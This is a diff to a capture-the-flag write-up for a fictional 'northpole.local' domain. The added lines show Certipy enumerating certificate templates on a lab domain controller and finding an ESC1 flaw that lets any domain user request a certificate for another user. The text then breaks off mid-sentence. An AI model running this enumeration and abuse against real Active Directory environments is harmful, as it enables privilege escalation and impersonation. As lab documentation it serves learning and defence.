@@ -198,12 +198,36 @@ Group 'researchers' has member: NORTHPOLE\wombleycube
 As "wombleycube" is the only user in the "researchers" group, we need to target him.
 
 ```
+alabaster@ssh-server-vm:~/impacket$ ./certipy find -dc-ip 10.0.0.53 -target-ip 10.0.0.53 -vulnerable -u elfy@northpole.local
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
+Password:
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Trying to get CA configuration for 'northpole-npdc01-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'northpole-npdc01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'northpole-npdc01-CA' via RRP
+[*] Got CA configuration for 'northpole-npdc01-CA'
+[*] Saved BloodHound data to '20231210143907_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
+[*] Saved text output to '20231210143907_Certipy.txt'
+[*] Saved JSON output to '20231210143907_Certipy.json'
+alabaster@ssh-server-vm:~/impacket$ cat 20231210143907_Certipy.json
+{
+[...]
+      "[!] Vulnerabilities": {
+        "ESC1": "'NORTHPOLE.LOCAL\\\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication"
+      }
+    }
+  }
+}
 ```
-
+So we can request a certificate for any user with 
 
 **Achievement: Ipsum**
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTEyNDkyNzQ5MSwxMDg3ODUzMTQ3LC0yMD
-EwMTkyNjNdfQ==
+eyJoaXN0b3J5IjpbOTI5ODY2NDMxLDEwODc4NTMxNDcsLTIwMT
+AxOTI2M119
 -->
